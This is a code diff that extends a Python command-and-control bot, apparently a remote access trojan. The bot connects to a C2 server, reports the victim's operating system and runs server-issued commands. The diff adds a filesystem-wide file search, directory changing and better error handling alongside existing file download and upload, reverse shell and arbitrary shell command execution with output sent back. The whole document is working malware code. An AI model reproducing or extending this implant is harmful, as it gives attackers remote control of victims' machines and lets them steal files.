@@ -113,6 +113,14 @@ def receive_data(socket):
     full_data = b''.join(fragments)
     return full_data
 
+def file_search(socket, file_name, starting_directory):
+    for root, dirs, filenames in os.walk(starting_directory):
+        for file in filenames:
+            if file == file_name:
+                socket.sendall(base64_encode( b'File found at' + os.path.join(root, file).encode()))
+                return
+    
+
 def main(ip, ports):
     """This function creates a socket and connects to the C2 server
     Args:
@@ -121,7 +129,9 @@ def main(ip, ports):
     """
     # Create socket 
     # print(ip)
+    start_dir = os.getcwd()
     c2_bot = socket.socket()
+    user_home = os.path.expanduser('~')
     # Attempt a connection to the target
     running = True
     # Uncomment below block to continuously attempt to connect to the C2 server
@@ -133,8 +143,7 @@ def main(ip, ports):
             os_family = platform.system()
             c2_bot.sendall(base64_encode(os_family.encode()))
             # c2_bot.sendall(base64_encode(b"Connected"))
-            current_dir = os.getcwd()
-            c2_bot.sendall(base64_encode(current_dir.encode()))
+            # c2_bot.sendall(base64_encode(current_dir.encode()))
             while True:
                 command = (c2_bot.recv(4096)).decode()
                 # print(command)
@@ -143,15 +152,17 @@ def main(ip, ports):
                 if command.lower() == "quit":
                     running = False
                     break
-                elif "download" in command:
+                elif "download" == command.split(" ")[0].lower():
+                    print("download")
                     file_name = command.split(" ")[1]
                     command = command.split(" ")[0]
                     send_file(c2_bot, file_name)
                 elif "shell" in command:
+                    print("shell")
                     reverse_shell(c2_bot, os_family)
-                elif "upload" in command:
+                elif "upload" == command.split(" ")[0].lower():
                     print("upload")
-                    print(command)
+                    # print(command)
                     # TODO: Implement upload functionality
                     file_name = command.split(" ")[1]
                     file_destination = command.split(" ")[2]
@@ -162,10 +173,34 @@ def main(ip, ports):
                     data = base64_decode(data)
                     with open(file_destination, "wb") as f:
                         f.write(data)
+                elif "cd" in command.split(" ")[0].lower():
+                    print("cd")
+                    directory = command.split(" ")[1]
+                    if directory == "~":
+                        directory = user_home
+                    os.chdir(directory)
+                    current_dir = os.getcwd()
+                    c2_bot.sendall(base64_encode(current_dir.encode()))
+                elif "search" == command.split(" ")[0].lower():
+                    print("search")
+                    file_name = command.split(" ")[1]
+                    if command.split(" ")[2] == "":
+                        if os_family == "Windows":
+                            starting_directory = "C:\\"
+                        else:
+                            starting_directory = "/"
+                    else:
+                        starting_directory = command.split(" ")[2]
+                    command = command.split(" ")[0]
+                    file_search(c2_bot, file_name, starting_directory)
                 else:
-                    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-                    return_code = result.returncode
-                    c2_bot.sendall(base64_encode(result.stdout))
+                    print("default")
+                    try:
+                        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+                        return_code = result.returncode
+                        c2_bot.sendall(base64_encode(result.stdout + result.stderr))
+                    except:
+                        c2_bot.sendall(base64_encode(b"[-] Command failed"))
             break
         except:
             print(f"Connection failed on port {port}")
